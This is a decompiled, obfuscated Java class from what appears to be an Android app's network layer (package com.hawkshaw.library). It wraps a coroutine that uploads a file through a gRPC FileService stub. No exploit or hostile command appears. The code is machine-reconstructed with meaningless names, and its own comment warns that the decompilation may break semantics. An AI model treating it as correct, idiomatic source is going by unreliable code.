package com.hawkshaw.library.datalayer.network.service;

import W2.y;
import Y1.C0110h;
import Y1.m0;
import a3.e;
import b3.C0298a;
import c3.C0331i;
import com.hawkshaw.library.FileServiceGrpcKt;
import i3.l;
import w3.C1066b;

public final class a extends C0331i implements l {

    /* renamed from: D  reason: collision with root package name */
    public int f4923D;

    /* renamed from: E  reason: collision with root package name */
    public final /* synthetic */ C1066b f4924E;

    /* JADX INFO: super call moved to the top of the method (can break code semantics) */
    public a(C1066b bVar, e eVar) {
        super(1, eVar);
        this.f4924E = bVar;
    }

    public final e create(e eVar) {
        return new a(this.f4924E, eVar);
    }

    public final Object invoke(Object obj) {
        return ((a) create((e) obj)).invokeSuspend(y.f2418a);
    }

    public final Object invokeSuspend(Object obj) {
        C0298a aVar = C0298a.f4140D;
        int i5 = this.f4923D;
        if (i5 == 0) {
            C0110h.P(obj);
            FileServiceGrpcKt.FileServiceCoroutineStub access$getFileService$p = FileServiceKt.fileService;
            this.f4923D = 1;
            obj = FileServiceGrpcKt.FileServiceCoroutineStub.uploadFile$default(access$getFileService$p, this.f4924E, (m0) null, this, 2, (Object) null);
            if (obj == aVar) {
                return aVar;
            }
        } else if (i5 == 1) {
            C0110h.P(obj);
        } else {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        return obj;
    }
}
